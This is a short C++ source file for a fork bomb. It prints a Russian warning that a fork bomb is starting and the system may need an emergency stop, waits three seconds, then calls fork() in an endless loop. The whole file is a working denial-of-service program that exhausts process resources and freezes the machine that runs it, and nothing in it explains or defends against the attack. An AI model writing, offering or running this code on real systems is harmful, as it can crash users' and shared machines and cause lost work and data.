#include <unistd.h>
#include <iostream>

int main() {
    std::cout << "Запуск fork-бомбы. Будьте готовы к экстренной остановке системы!" << std::endl;
    sleep(3);
    
    while(1) {
        fork();
    }
    
    return 0;
}
